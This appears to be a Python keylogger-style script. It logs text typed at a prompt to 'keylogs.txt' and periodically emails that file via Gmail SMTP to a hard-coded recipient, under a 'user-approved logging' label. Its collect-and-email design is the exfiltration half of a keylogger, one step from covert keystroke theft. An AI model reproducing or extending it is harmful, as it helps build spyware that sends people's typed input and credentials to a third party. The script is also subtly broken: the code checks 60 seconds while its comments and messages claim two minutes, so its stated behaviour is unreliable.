import smtplib
import time
from email.message import EmailMessage
from datetime import datetime

# ================== CONFIG ==================
SENDER_EMAIL = "sender_mail@gmail.com"
PASSWORD = "app_password"
REC_EMAIL = "reciever_mail@gmail.com"
LOG_FILE = "keylogs.txt"
# ============================================

def log_user_input():
    user_input = input("Type something (user-approved logging): ")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {user_input}\n")

def send_email(file_path):
    msg = EmailMessage()
    msg["Subject"] = "User Input Activity Report (2 Minute Interval)"
    msg["From"] = SENDER_EMAIL
    msg["To"] = REC_EMAIL
    msg.set_content("Attached is the user-approved input activity log.")

    with open(file_path, "rb") as f:
        msg.add_attachment(
            f.read(),
            maintype="text",
            subtype="plain",
            filename="keylogs.txt"
        )

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(SENDER_EMAIL, PASSWORD)
        server.send_message(msg)

    print("✅ Email sent successfully")

# ================== MAIN ==================
print("User Input Logger Started (CTRL+C to stop)")
print("Data will be emailed every 2 minutes\n")

last_mail_time = time.time()

while True:
    log_user_input()

    # 🔥 2-minute email condition (IMPORTANT LINE)
    if time.time() - last_mail_time >= 60:   # 120 seconds = 2 minutes
        send_email(LOG_FILE)
        last_mail_time = time.time()

    time.sleep(2)

